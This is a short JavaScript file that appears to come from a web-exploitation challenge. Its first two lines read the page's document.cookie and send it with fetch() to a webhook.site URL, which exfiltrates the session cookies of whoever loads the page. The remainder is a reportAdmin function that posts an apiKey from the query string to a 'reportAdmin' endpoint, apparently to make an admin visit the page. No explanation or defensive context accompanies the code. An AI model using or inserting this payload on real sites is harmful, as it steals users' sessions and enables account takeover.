var url = "	https://webhook.site/31ba2930-2031-4897-b9be-3dd3a69a340b/?" + document.cookie;
fetch(url);

function reportAdmin() {
    const queryParams = new URLSearchParams(window.location.search);
    const apiKey = queryParams.get("apiKey");
    var xhttp = new XMLHttpRequest();
    // Set the HTTP method and API endpoint
    xhttp.open("POST", "reportAdmin");
    xhttp.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
    xhttp.send("key="+encodeURIComponent(apiKey));
    xhttp.onreadystatechange = function() {
        if (this.readyState === 4 && this.status === 200) {
                alert("Reported to admin!");
        }
    }
}
